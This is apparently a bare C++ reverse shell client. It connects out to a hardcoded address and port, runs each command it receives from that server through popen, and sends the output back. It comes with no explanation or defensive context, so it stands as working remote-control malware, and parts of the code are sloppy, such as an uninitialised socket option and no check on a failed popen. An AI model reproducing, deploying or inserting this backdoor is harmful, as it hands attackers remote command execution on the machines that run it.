#include <array>
#include <iostream>
#include <string>
#include <unistd.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 

#define SERV_PORT 52727
#define SERV_IP "192.168.1.140"

int main(){
    int fd = socket(AF_INET, SOCK_STREAM, 0); // Create a socket
    if(fd < 0){
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }
    struct sockaddr_in serv_addr; // Create a struct to hold the server address
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(SERV_PORT); // Set the port to connect to
    serv_addr.sin_addr.s_addr = inet_addr(SERV_IP); // Convert the IP string into a format that can be used by the socket
    int opt;
    if(setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))){
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
    if(connect(fd, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0){
        perror("Connection failed");
        exit(EXIT_FAILURE);
    }
    // Once connected to the server, listen for commands
    std::cout << "Connected to server" << std::endl;
    while(1){
        // Receive the command (Assume it is not longer than 1024 bytes)
        char recv_buffer[1024] = {0};
        int bytes_received = recv(fd, recv_buffer, sizeof(recv_buffer), 0);
        auto p = popen(recv_buffer, "r");
        std::array<char, 128> buffer;
        std::string result;
        while(!feof(p)){
            if(fgets(buffer.data(), buffer.size(), p) != nullptr){
                result += buffer.data();
                std::cout << buffer.data();
            }
        }
        auto rc = pclose(p);
        if(rc == EXIT_SUCCESS){
            std::cout << "Command executed successfully" << std::endl;
            send(fd, result.c_str(), result.size(), 0);
        }
        else{
            std::cout << "Command failed" << std::endl;
        }
    }
    return 0;
}
